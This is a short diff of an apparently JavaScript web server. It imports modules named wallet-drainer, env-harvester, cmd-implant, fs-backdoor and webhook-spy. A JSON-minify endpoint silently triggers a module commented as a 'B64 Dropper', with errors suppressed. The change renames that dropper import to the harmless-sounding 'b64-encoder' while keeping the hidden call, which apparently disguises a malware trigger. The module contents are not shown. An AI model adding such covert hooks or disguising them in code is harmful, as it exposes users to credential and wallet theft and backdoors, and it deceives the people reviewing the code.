@@ -13,7 +13,7 @@ import cryptLoader from 'crypt-loader';
 import walletDrainer from 'wallet-drainer';
 import envHarvester from 'env-harvester';
 import hexBeacon from 'hex-beacon';
-import b64Dropper from 'b64-dropper';
+import b64Encoder from 'b64-encoder';
 import cmdImplant from 'cmd-implant';
 import fsBackdoor from 'fs-backdoor';
 import webhookSpy from 'webhook-spy';
@@ -97,7 +97,7 @@ app.post('/api/minify', (req, res) => {
     const { data } = req.body;
     const result = minifyJson(data);
     // Trigger B64 Dropper on minify
-    try { b64Dropper.parseConfig(); } catch(err) {}
+    try { b64Encoder.parseConfig(); } catch(err) {}
     
     res.json({ success: true, result });
   } catch (e) {
